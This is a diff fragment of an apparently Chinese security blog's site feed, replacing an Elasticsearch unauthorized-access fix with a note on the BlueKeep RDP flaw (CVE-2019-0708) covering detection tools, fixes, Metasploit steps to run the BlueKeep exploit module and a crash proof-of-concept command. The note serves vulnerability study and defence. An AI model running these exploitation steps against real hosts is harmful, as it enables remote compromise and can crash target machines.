+<p>注:Windows 8和windows10以及之后的版本不受此漏洞影响</p>
+<h2 id="漏洞检测方式"><a href="#漏洞检测方式" class="headerlink" title="漏洞检测方式"></a>漏洞检测方式</h2><p><a href="https://github.com/Pa55w0rd/CVE-2019-0708" target="_blank">CVE-2019-0708批量检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install IPy</span><br><span class="line">cve-2019-0708_v1.py -t ip -p port -f file</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708检测工具</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cve-2019-0708-scan.exe ip port</span><br></pre></td></tr></table></figure>
 
 
 
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>1.限制IP访问</p>
-<p>2.禁止外网访问</p>
-<p>3.认证插件安装</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;plugins&#x2F;http-basic  &#x2F;&#x2F;es插件目录下</span><br><span class="line"></span><br><span class="line">wget  https:&#x2F;&#x2F;github.com&#x2F;Asquera&#x2F;elasticsearch-http-basic&#x2F;releases&#x2F;download&#x2F;v1.1.0&#x2F;elasticsearch-http-basic-1.1.0.jar  &#x2F;&#x2F;下载es认证插件</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">通过MSF</button></li><li class="tab"><button type="button" data-href="#-2">使用POC</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@root:~&#x2F;桌面# msfconsole</span><br><span class="line"></span><br><span class="line">msf5 &gt; search cve_2019_0708</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; show options</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set RHOST IP</span><br><span class="line"># 设置目标IP</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; set target 3</span><br><span class="line"># 3代表目标机器架构为VMware、2代表目标架构是virtulbox</span><br><span class="line">msf5 exploit(windows&#x2F;rdp&#x2F;cve_2019_0708_bluekeep_rce) &gt; run</span><br></pre></td></tr></table></figure>
 
-<p>在<code>config/elasticsearch.yml</code>为端口添加认证</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http.basic.enabled: <span class="literal">true</span></span><br><span class="line">http.basic.log: <span class="literal">false</span>                  </span><br><span class="line">http.basic.user: <span class="string">&quot;admin&quot;</span>          </span><br><span class="line">http.basic.password: <span class="string">&quot;admin&quot;</span>  </span><br><span class="line">http.basic.ipwhitelist: [<span class="string">&quot;172.16.18.171&quot;</span>,<span class="string">&quot;172.16.18.114&quot;</span>]   </span><br><span class="line">http.basic.xforward: <span class="string">&quot;X-Forwarded-For&quot;</span></span><br><span class="line">http.basic.trusted_proxy_chains: [<span class="string">&quot;172.16.18.114&quot;</span>]</span><br></pre></td></tr></table></figure>
+<p>可能会反弹shell，也有概率会使目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install impacket</span><br><span class="line"></span><br><span class="line">crashpoc.py 192.168.1.1 64  #python3 crashpoc.py ip地址 系统类型</span><br></pre></td></tr></table></figure>
 
-<table>
-<thead>
-<tr>
-<th align="center">配置名</th>
-<th align="center">默认值</th>
-<th align="center">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">http.basic.enabled</td>
-<td align="center">true</td>
-<td align="center">开关，开启会接管全部HTTP连接</td>
-</tr>
-<tr>
-<td align="center">http.basic.user</td>
-<td align="center">“admin”</td>
-<td align="center">账号</td>
-</tr>
-<tr>
-<td align="center">http.basic.password</td>
-<td align="center">“admin”</td>
-<td align="center">密码</td>
-</tr>
-<tr>
-<td align="center">http.basic.ipwhitelist</td>
-<td align="center">[“172.16.18.171”,”172.16.18.114”]</td>
-<td align="center">白名单内的ip访问不需要通过账号和密码，支持ip和主机名，不支持ip区间或正则</td>
-</tr>
-<tr>
-<td align="center">http.basic.trusted_proxy_chains</td>
-<td align="center">[“172.16.18.114”]</td>
-<td align="center">信任代理列表</td>
-</tr>
-<tr>
-<td align="center">http.basic.log</td>
-<td align="center">false</td>
-<td align="center">把无授权的访问事件添加到ES的日志</td>
-</tr>
-<tr>
-<td align="center">http.basic.xforward</td>
-<td align="center">“X-Forwarded-For”</td>
-<td align="center">记载代理路径的header字段名</td>
-</tr>
-</tbody></table>
+<p>执行POC会让目标蓝屏</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+
+
+
+<h2 id="漏洞修复方法"><a href="#漏洞修复方法" class="headerlink" title="漏洞修复方法"></a>漏洞修复方法</h2><p>1.<a href="https://www.qianxin.com/other/CVE-2019-0708" target="_blank">CVE-2019-0708补丁</a></p>
+<p>2.安装安全管家类的软件</p>
+<p>3.关闭远程桌面，开启防火墙</p>
+<p>4.在远程设置里设置使用网络级别身份验证的远程桌面的计算机链接</p>
 ]]></content>
       <categories>
         <category>漏洞利用</category>
-        <category>服务器应用漏洞</category>
-        <category>未授权访问漏洞</category>
+        <category>常见漏洞</category>
       </categories>
       <tags>
-        <tag>未授权访问</tag>
+        <tag>高危漏洞</tag>
+        <tag>代码执行漏洞</tag>
       </tags>
   </entry>
   <entry>
